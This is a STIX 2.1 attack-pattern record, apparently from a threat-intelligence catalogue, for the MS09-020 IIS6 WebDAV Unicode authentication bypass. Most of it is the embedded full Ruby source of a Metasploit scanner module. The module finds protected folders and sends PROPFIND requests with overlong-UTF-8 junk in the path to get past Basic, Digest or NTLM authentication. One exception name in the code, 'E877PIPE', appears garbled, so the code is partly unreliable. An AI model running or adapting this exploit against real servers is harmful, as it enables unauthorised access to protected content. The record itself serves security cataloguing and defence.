{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b6452a5a-d8bf-4ea4-9cf6-0f425b49f7a6",
    "created": "2024-08-14T16:28:52.936344Z",
    "modified": "2024-08-14T16:28:52.936349Z",
    "name": "MS09-020 IIS6 WebDAV Unicode Authentication Bypass",
    "description": " This module attempts to to bypass authentication using the WebDAV IIS6 Unicode vulnerability discovered by Kingcope. The vulnerability appears to be exploitable where WebDAV is enabled on the IIS6 server, and any protected folder requires either Basic, Digest or NTLM authentication. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/ms09_020_webdav_unicode_bypass.rb",
            "external_id": "ms09_020_webdav_unicode_bypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1535"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1122"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::WmapScanDir\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'   \t\t=> 'MS09-020 IIS6 WebDAV Unicode Authentication Bypass',\n      'Description'\t=> %q{\n        This module attempts to to bypass authentication using the WebDAV IIS6\n        Unicode vulnerability discovered by Kingcope. The vulnerability appears\n        to be exploitable where WebDAV is enabled on the IIS6 server, and any\n        protected folder requires either Basic, Digest or NTLM authentication.\n      },\n      'Author' \t\t=> [ 'et', 'aushack' ],\n      'License'\t\t=> MSF_LICENSE,\n      'References'   =>\n        [\n          [ 'MSB', 'MS09-020' ],\n          [ 'CVE', '2009-1535' ],\n          [ 'CVE', '2009-1122' ],\n          [ 'OSVDB', '54555' ],\n          [ 'BID', '34993' ],\n        ]\n      ))\n\n    register_options(\n      [\n        OptString.new('PATH', [ true,  \"The path to protected folder\", '/'])\n      ])\n\n  end\n\n  def run_host(ip)\n    tpath = normalize_uri(datastore['PATH'])\n    if tpath[-1,1] != '/'\n      tpath += '/'\n    end\n\n    vhost = datastore['VHOST'] || wmap_target_host\n    prot  = datastore['SSL'] ? 'https' : 'http'\n\n    webdav_req = '<?xml version=\"1.0\" encoding=\"utf-8\"?><propfind xmlns=\"DAV:\"><prop><getcontentlength xmlns=\"DAV:\"/>' +\n      '<getlastmodified xmlns=\"DAV:\"/><executable xmlns=\"http://apache.org/dav/props/\"/><resourcetype xmlns=\"DAV:\"/>' +\n      '<checked-in xmlns=\"DAV:\"/><checked-out xmlns=\"DAV:\"/></prop></propfind>'\n\n    begin\n      res = send_request_cgi({\n        'uri'  \t\t=>  tpath,\n        'method'   \t=> 'PROPFIND',\n        'ctype'\t\t=> 'application/xml',\n        'headers' \t=>\n          {\n          },\n        'data'\t\t=> webdav_req + \"\\r\\n\\r\\n\",\n      }, 20)\n\n      if(not res)\n        print_error(\"NO Response.\")\n      elsif (res.code.to_i == 401)\n        print_status(\"#{rhost}:#{rport} Confirmed protected folder #{wmap_base_url}#{tpath} #{res.code} (#{wmap_target_host})\")\n        print_status(\"#{rhost}:#{rport} \\tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.\")\n\n        cset  = %W{ & ^ % $ # @ ! }\n        buff  = ''\n        blen  = rand(16)+1\n        while(buff.length < blen)\n          buff << cset[ rand(cset.length) ]\n        end\n        bogus = Rex::Text.uri_encode(Rex::Text.to_unicode( buff, 'utf-8', 'overlong', 2))\n\n        res = send_request_cgi({\n          'uri'  \t\t=>  tpath + bogus+'/',\n          'method'   \t=> 'PROPFIND',\n          'ctype'\t\t=> 'application/xml',\n          'headers' \t=>\n            {\n              #'Translate'\t => 'f', # Not required in PROPFIND, only GET - aushack 20091518\n            },\n          'data'\t\t=> webdav_req + \"\\r\\n\\r\\n\",\n        }, 20)\n\n        if (res.code.to_i == 207)\n          print_good(\"#{rhost}:#{rport} \\tFound vulnerable WebDAV Unicode bypass.  #{wmap_base_url}#{tpath}#{bogus}/ #{res.code} (#{wmap_target_host})\")\n\n\n          report_vuln(\n            {\n              :host\t=> ip,\n              :port\t=> rport,\n              :proto\t=> 'tcp',\n              :sname  => ssl ? 'https' : 'http',\n              :name\t=> self.name,\n              :info\t=> \"Module #{self.fullname} bypassed authentication with #{tpath}#{bogus} (response code #{res.code})\",\n              :refs   => self.references,\n              :exploited_at => Time.now.utc\n            }\n          )\n\n        end\n      else\n        print_error(\"#{rhost}:#{rport} Folder does not require authentication. [#{res.code}]\")\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::E877PIPE\n    end\n  end\nend\n"
}